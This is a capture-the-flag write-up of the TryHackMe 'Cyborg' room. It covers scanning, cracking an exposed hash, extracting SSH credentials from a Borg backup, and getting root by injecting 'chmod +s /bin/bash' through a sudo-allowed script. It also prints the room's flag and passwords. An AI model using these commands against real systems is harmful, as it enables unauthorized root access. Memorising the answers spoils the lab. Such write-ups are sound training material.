# 🛡️ TryHackMe – Cyborg - Writeup

## 📌 Overview
**Room Name:** Cyborg  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Exploitation / Archive Analysis / Privilege Escalation

Linux machine. Exposed password hash and Borg Backup archive on a web server lead to SSH credentials, then root via command injection in a sudo-allowed backup script.

The attack chain involves:

- Web directory discovery revealing exposed hash and Borg Backup archive
- hashcat to crack the archive password
- Borg Backup extraction revealing SSH credentials
- Command injection in a sudo-allowed backup script for root access

---

## 🔍 1. Enumeration

### 🔎 Port Scanning
Initial reconnaissance with `rustscan`:

```bash
rustscan -a <TARGET_IP>
```

```text
22/tcp open  ssh
80/tcp open  http
```

### 🌐 Web Directory Discovery
The root page was a default Apache installation. Used `gobuster` to find hidden directories:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt -x php -t 50
```

Key findings:

- `/admin` — Shoutbox mentioning insecure squid proxy settings; also contained a downloadable `archive.tar`
- `/etc` — Exposed a `passwd` file containing a password hash and a `squid.conf` configuration file

---

## 🔓 2. Initial Access

### 🔑 Hash Cracking
The hash extracted from `/etc/passwd`:

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

Cracked with `hashcat` (Apache MD5 mode `-m 1600`):

```bash
hashcat '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/wordlists/rockyou.txt -m 1600
```

**Password:** `squidward`

### 📦 Borg Backup Extraction
Downloaded `archive.tar` from `/admin`. After extraction, it was identified as a **Borg Backup repository**. Extracted contents using the cracked password:

```bash
borg extract ./home/field/dev/final_archive::music_archive
```

Inside, `note.txt` revealed Alex's SSH credentials:

```
Username: alex
Password: S3cretP@s3
```

Logged in via SSH:

```bash
ssh alex@<TARGET_IP>
```

**Initial access as `alex` achieved.** ✅

---

## 👑 3. Privilege Escalation: alex → root

### 🔍 Sudo Misconfiguration — Command Injection
Checked sudo permissions:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Analysis of `backup.sh` revealed the `-c` flag allowed arbitrary command execution due to insufficient input validation.

### 🔓 Gaining Root Shell
Set the SUID bit on `/bin/bash`:

```bash
sudo /etc/mp3backups/backup.sh -c 'chmod +s /bin/bash'
/bin/bash -p
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 👑 Root Flag

```bash
cat /root/root.txt
```

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

---

## 📚 Key Takeaways

- 🌐 **Don't expose internal directories:** The `/etc` folder on the webserver exposed password hashes and configuration files. System paths should never be web-accessible.
- 🔑 **Weak passwords undermine strong encryption:** Borg Backup is solid cryptography, but a dictionary-crackable password like `squidward` renders it useless.
- 🛠️ **Scripts with sudo rights must sanitize input:** `backup.sh` trusted user-supplied flags without validation. Any script running with elevated privileges must strictly control what it executes.
- 📝 **Credentials in plaintext files are a critical risk:** Storing passwords in `note.txt` inside a backup archive is one careless step away from full compromise.

---

## 🛠️ Tools Used

- `rustscan`
- `gobuster`
- `hashcat`
- `borg`
- `ssh`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
